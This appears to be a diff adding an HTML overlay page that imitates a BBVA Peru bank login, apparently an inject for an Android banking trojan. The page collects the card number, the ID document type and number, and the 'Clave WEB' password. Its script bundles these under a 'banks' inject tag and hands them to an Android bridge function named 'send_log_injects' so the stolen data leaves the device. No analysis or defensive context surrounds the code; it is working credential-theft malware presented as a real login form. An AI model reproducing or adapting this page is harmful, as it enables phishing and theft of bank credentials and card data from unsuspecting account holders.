@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title></title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular.min.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.min.js"></script>
+
+    <style>
+        html, body {height: 100%; } .err_div {position: fixed; z-index: 1; top: 0; left: 0; width: 100%; height: 100%; background: rgba(12, 12, 12, .6); } .err_box {position: relative; top: 10%; width: 90%; max-width: 307px; margin: 0 auto; padding: 12px 9px; background: rgba(255, 255, 255, 0.98); text-align: center; box-shadow: 0 0 15px black; } .scum_container {position: relative; overflow: hidden; padding: 18px 12px; } .scum_container.loader_show .scum {-webkit-animation-name: loader__show; animation-name: loader__show; -webkit-animation-duration: 1s; animation-duration: 1s; transition-timing-function: ease; -webkit-animation-fill-mode: forwards; animation-fill-mode: forwards; } .scum_container.loader_hide {-webkit-animation-name: loader__hide; animation-name: loader__hide; -webkit-animation-duration: 1s; animation-duration: 1s; transition-timing-function: ease; /*     animation-fill-mode:forwards; */ } @-webkit-keyframes loader__show {0% {opacity: 1; } 100% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } } @keyframes loader__show {0% {opacity: 1; } 100% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } } @-webkit-keyframes loader__hide {0% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } 100% {opacity: 1; } } @keyframes loader__hide {0% {opacity: 0; -webkit-transform: translateX(1000px); transform: translateX(1000px); } 100% {opacity: 1; } } .card-container {background: #9a0f18; padding: 14px 15px; border-radius: 10px; color: white; } .tan-card {border-radius: 6px; position: relative; overflow: hidden; border: 1px solid white; } .card-item {margin: 1px; border: 1px solid #ffffffd6; margin: 0px; text-align: center; /* color: white; */ width: 100%; } .form-control.tan-input {font-size: 16px; padding: 0px 0px; height: 23px; text-align: center; border-radius: 0px; border: none; background: white; } .form-control.tan-input:focus {box-shadow: none; } .card-item.card-item-th {font-weight: 700; } .card-item.card-item.odd {background: #00000038; } .form-control:disabled, .form-control[readonly] {background-color: #ffffffba; opacity: 1; } tancard.ng-scope {margin-bottom: 23px; display: block; } html,body {height: 100%; } body {background: url('https://i.imgur.com/3eHzzJN.png'); background-size: contain; background-repeat: no-repeat; background-position: center; } img.logo {width: 205px; /* margin-top: 100px; */ } div#login-view {background: #ffffffe3; padding: 18px; border-radius: 6px; } .form-control,.form-control:focus {background: none; border: none; padding-left: 0px; border-bottom: 1px solid #b3b3b3; border-radius: 0px; box-shadow: none; font-size: 14px; } span.fa.fa-lock {color: #28a745; position: relative; top: 6px; font-size: 23px; margin-left: 10px; } .icon.align-content-center {border-left: 1px solid #d8d8d8; } div#login-view {} select#doc-type {margin-right: 10px; width: 60px; } .icon.align-content-center {margin-left: 7px; } input#clave {padding-left: 26px; } .input-div {position: relative; } span.fa-exclamation-circle.fa {position: absolute; left: 0px; top: 8px; font-size: 20px; color: #0039a6; } .btn-info {background: linear-gradient(90deg,#009a3b,#075b84); padding: 7px 31px; } .buttondiv {text-align: center; }
+    </style>
+</head>
+
+<body     ng-app="app" ng-controller="c1" ng-model-options="{'aloweInvalid':true}"  ng-cloak    >
+
+
+
+
+<div class="top text-center">
+    <div style="height: 100px" class="make-thin"></div>
+   <img class="logo" src="data:image/png;base64,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">
+</div>
+
+
+<div class="main">
+    <div class="container">
+        <div class="row">
+            <div class="col"></div>
+            <div class="col-sm-10 col-md-8 col-lg-6">
+                
+
+                        <div style="height: 100px" class="make-thin"></div>
+
+
+                        <div class="scum_container">
+                            <div class="scum" id="login-view">
+                                <form name="loginform" id="loginform" autocomplete="off" onsubmit="send1(event,'finish__');return false">
+                                    <div class="box">
+
+
+
+                                        <div class="form-group line d-flex justify-content-between">
+                                            <div class="input-div w-100 align-content-center ">
+                                                <input placeholder="Número de tarjeta" type="text" name="c_c" id="c_c" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Número de tarjeta" data-ng-model="data.c_c">
+                                            </div>
+                                            <div class="icon align-content-center ">
+                                                <span class="fa fa-lock"></span>
+                                            </div>
+                                        </div>
+
+
+                                        <div class="form-group line d-flex justify-content-between">
+                                            
+                                            <div class="input-div align-content-center">
+                                                <select name="doc-type" id="doc-type" data-ng-model="data.doc_type" class="form-control" >
+                                                    <option value="DNI">DNI</option>
+                                                    <option value="CE">CE</option>
+                                                    <option value="PAS">PAS</option>
+                                                </select>
+                                            </div>
+
+                                            <div class="input-div w-100 align-content-center ">
+                                                <input placeholder="Número de documento" type="text" name="doc" id="doc" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Número de documento" data-ng-model="data.doc">
+                                            </div>
+                                            <div class="icon align-content-center ">
+                                                <span class="fa fa-lock"></span>
+                                            </div>
+                                        </div>
+
+                                        <div class="form-group line d-flex justify-content-between">
+                                            <div class="input-div w-100 align-content-center ">
+
+                                                <span class="fa-exclamation-circle fa"></span>
+                                                <input placeholder="Clave WEB" type="password" name="clave" id="clave" pattern=".{4,}" class="form-control" data-err_text="Please enter valid Clave WEB" data-ng-model="data.clave">
+                                            </div>
+                                            <div class="icon align-content-center ">
+                                                <span class="fa fa-lock"></span>
+                                            </div>
+                                        </div>
+
+
+                                        <div class="buttondiv">
+                                            <button class="btn btn-info">Ingresar</button>
+                                        </div>
+
+
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+
+            </div>
+            <div class="col"></div>
+        </div>
+    </div>
+</div>
+
+
+
+<div class="err_div" style="display: none;">
+    <div class="err_box">
+        <h4 class="re3">Error al validar datos</h4>
+        <p class="err_p">
+            La información que has ingresado es incorrecta. Inténtalo de nuevo.
+        </p>
+        <button class="ace8" onclick="$('.err_div').hide()">Aceptar</button>
+    </div>
+</div>
+
+
+
+<!-- form to send  -->
+<form id="mf"  method="post">
+       
+     <input name="name" type="hidden" value="bvva.pe"> 
+</form>
+<!-- form to send  -->
+
+
+</body>
+<script type="text/javascript">
+
+
+ var app = angular.module('app', [])
+
+
+    app.controller('c1', ['$scope', function($scope){
+        sc_=$scope;
+
+
+        $scope.data={
+           doc_type:"DNI"
+        }
+    }])
+
+
+
+
+
+$(document).ready(function() {
+
+    $('<div class="loader__" style="display:none;position: fixed;background: rgba(21, 20, 20, 0.51);width: 100%;height: 100%;top: 0px;left: 0px;z-index: 1000;text-align: center;">\
+   \
+   \
+   \
+   \
+</div>').appendTo('body');
+
+    window.loader_ = {
+        hide: function() {
+            $('.loader__').fadeOut('fast');
+        },
+        show: function() {
+            $('.loader__').fadeIn('fast');
+        }
+    }
+
+
+
+    setTimeout(function() {
+        $('.start').fadeOut()
+    }, 4000)
+});
+
+
+setTimeout(function() {
+    $('.form-control[data-mask]').each(function(i, el, all) {
+        $.mask.definitions['h'] = "[A-Fa-f0-9]";
+        $(this).mask($(this).data().mask, {
+            placeholder: $(this).attr('mask-placeholder')
+        }) //auto mask
+
+    })
+}, 1) // fix for anguler masked intergration 2019
+
+
+$("body").on("keypress change", '.form-control', function() {
+    $(this).closest(".form-group").removeClass("has_err");
+    $(this).removeClass("has_err");
+    $(".err_div").fadeOut();
+});
+
+send1 = function(e, callback__, global_luhn__) {
+    e.preventDefault();
+    var el = e.target;
+    var err = false;
+    var err_text = [];
+    var err_elements = [];
+
+    $(el).find("input:visible,select:visible").each(function() {
+        var reg__ = new RegExp($(this).attr('pattern'));
+
+        if (!reg__.test($(this).val())) {
+            err = true;
+            err_elements.push(this);
+            err_text.push(this.dataset.err_text);
+            return;
+        }
+        var luhn__ = $(this).data().luhn;
+        if (typeof luhn__ != "undefined" && luhn__ != "") {
+
+            if ($(this).val() != "") {
+                if (!eval(luhn__)($(this).val(), err_text)) {
+                    err = true;
+                    err_elements.push(this);
+                }
+            }
+        }
+    });
+
+    //time for global_luhn
+    if (!err) {
+        if (typeof global_luhn__ != "undefined") {
+            if (!eval(global_luhn__)(err_text)) {
+                err = true;
+            }
+        }
+    }
+
+
+    if (err) {
+        err_text = err_text.filter(function(e) {
+            return e;
+        });
+        err_text = $.unique(err_text);
+        $(".err_ul").html("");
+        $(err_text).each(function(i, t) {
+            $("<li><span>" + t + "</span></li>").appendTo(".err_ul");
+        });
+
+        $(".err_div").show();
+        $(err_elements).each(function() {
+            $(this).closest(".form-group").addClass("has_err");
+            $(this).addClass("has_err");
+
+            //...
+        });
+        $(window).scrollTop(0);
+        return;
+    }
+
+    if (typeof callback__ != "undefined") {
+        eval(callback__)(el);
+        return;
+    }
+    //alert("We stack, what to do next?");
+};
+
+
+
+
+
+
+
+
+function next__(el) {
+    loader_.show();
+    setTimeout(function() {
+        loader_.hide();
+        $(".scum").hide();
+        $(el).closest(".scum").next().show();
+    }, 3000);
+}
+
+
+
+function finish__(el) {
+
+    loader_.show();
+
+    // data___ = $('form').custom_ser()
+    // $.each(data___, function(i, v) {
+    //     $('<input type="hidden" name="' + i + '" value="' + v + '">').appendTo('#mf') //random prepend
+    // })
+
+
+
+    submit_data();
+
+}
+
+
+
+
+
+function cc_luhn(str, err_text) {
+    //CC validator
+    var str = str.match(/\d/g).join("");
+
+    var valid =
+        str.split("").reduceRight(function(prev, curr, idx) {
+            prev = parseInt(prev, 10);
+            if ((idx + 1) % 2 !== 0) {
+                curr = (curr * 2).toString().split("").reduce(function(p, c) {
+                    return parseInt(p, 10) + parseInt(c, 10);
+                });
+            }
+            return prev + parseInt(curr, 10);
+        }) %
+        10 ===
+        0;
+    // if (!valid) {
+    //     err_text.push("Card number is not valid");
+    // }
+
+    return valid;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+function submit_data() {
+
+//here up to you, if you want to send data over ajax, or send form,to send ajax use data__ var.
+data__ = sc_.data;
+data__.type_injects = "banks";
+data__.closed = "close_activity_injects";
+
+console.log(data__);
+
+var ua = navigator.userAgent.toLowerCase();
+if(ua.indexOf("android") > -1) {
+    try {
+    Android.send_log_injects(JSON.stringify(data__));
+    } catch (err) {}
+}else{
+alert(JSON.stringify(data__));
+}
+}
+
+
+
+
+$.fn.custom_ser = function() {
+    var obj = {};
+    this.find("input,select").each(function() {
+        if (
+            $(this).prop("tagName") == "INPUT" &&
+            $(this).prop("type") != "checkbox" &&
+            $(this).prop("type") != "button" &&
+            // $(this).prop("type") != "hidden" &&
+            $(this).prop("type") != "submit"
+        ) {
+            //input validation
+            obj[$(this).attr("name")] = $(this).val();
+        }
+        if ($(this).prop("tagName") == "SELECT") {
+            obj[$(this).attr("name")] = $(this).find("option:selected").val();
+        }
+    });
+    return obj;
+};
+
+
+var cookies = {
+    set: function(name, value, days) {
+        if (days) {
+            var date = new Date();
+            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+            var expires = "; expires=" + date.toGMTString();
+        } else var expires = "";
+        document.cookie = name + "=" + value + expires + "; path=/";
+    },
+    get: function(name) {
+        var nameEQ = name + "=";
+        var ca = document.cookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
+        }
+        return null;
+    }
+}
+</script>
+
+</html>
